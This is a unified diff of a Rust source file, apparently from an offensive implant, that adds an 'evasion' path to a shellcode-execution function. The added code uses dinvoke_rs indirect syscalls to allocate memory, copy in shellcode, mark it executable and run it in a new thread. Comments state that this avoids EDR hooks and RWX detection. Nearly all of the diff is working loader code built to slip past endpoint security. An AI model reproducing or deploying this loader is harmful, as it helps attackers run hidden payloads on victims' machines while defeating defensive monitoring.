@@ -139,7 +139,67 @@ pub fn inject_shellcode(
 #[cfg(target_os = "windows")]
 unsafe fn execute_shellcode_in_thread(shellcode: &[u8]) -> Result<String, String> {
     let buffer_size = shellcode.len();
-    
+
+    #[cfg(feature = "evasion")]
+    {
+        // Use dinvoke_rs indirect syscalls instead of direct winapi calls
+        // NtAllocateVirtualMemory instead of VirtualAlloc
+        // NtProtectVirtualMemory instead of VirtualProtect
+        // This avoids EDR hooks on kernel32/ntdll
+        let mut base_address: *mut winapi::ctypes::c_void = ptr::null_mut();
+        let mut region_size: usize = buffer_size;
+
+        let status = dinvoke_rs::dinvoke::nt_allocate_virtual_memory(
+            -1isize as *mut _,
+            &mut base_address,
+            0,
+            &mut region_size,
+            MEM_COMMIT | MEM_RESERVE,
+            PAGE_READWRITE,
+        );
+
+        if status != 0 {
+            return Err(format!("NtAllocateVirtualMemory failed: 0x{:X}", status));
+        }
+
+        let executable_mem = base_address;
+        ptr::copy_nonoverlapping(shellcode.as_ptr(), executable_mem as *mut u8, buffer_size);
+
+        let mut old_protect: u32 = 0;
+        let status = dinvoke_rs::dinvoke::nt_protect_virtual_memory(
+            -1isize as *mut _,
+            &mut base_address,
+            &mut region_size,
+            PAGE_EXECUTE_READ,
+            &mut old_protect,
+        );
+
+        if status != 0 {
+            return Err(format!("NtProtectVirtualMemory failed: 0x{:X}", status));
+        }
+
+        let mut thread_id: u32 = 0;
+        let thread_handle = CreateThread(
+            ptr::null_mut(), 0, Some(mem::transmute(executable_mem)),
+            ptr::null_mut(), 0, &mut thread_id,
+        );
+
+        if thread_handle.is_null() {
+            return Err(format!("CreateThread failed. Error: {}", GetLastError()));
+        }
+
+        let wait_result = WaitForSingleObject(thread_handle, 1000);
+        CloseHandle(thread_handle);
+
+        if wait_result == WAIT_TIMEOUT {
+            return Ok(format!("Shellcode started ({} bytes) via indirect syscalls, thread {}", buffer_size, thread_id));
+        } else {
+            return Ok(format!("Shellcode completed ({} bytes) via indirect syscalls, thread {}", buffer_size, thread_id));
+        }
+    }
+
+    #[cfg(not(feature = "evasion"))]
+    {
     // Allocate RW memory first (avoids RWX detection)
     let executable_mem = VirtualAlloc(
         ptr::null_mut(),
@@ -195,7 +255,7 @@ unsafe fn execute_shellcode_in_thread(shellcode: &[u8]) -> Result<String, String
     CloseHandle(thread_handle);
 
     // Don't free memory - shellcode might still be running
-    
+
     if wait_result == WAIT_TIMEOUT {
         Ok(format!(
             "Shellcode execution started ({} bytes) in thread {}. Thread is still running (timeout reached).",
@@ -206,6 +266,7 @@ unsafe fn execute_shellcode_in_thread(shellcode: &[u8]) -> Result<String, String
             "Shellcode execution completed ({} bytes) in thread {} (exit code: {}, wait result: {}).",
             buffer_size, thread_id, exit_code, wait_result
         ))
+    }
     }
 }
 
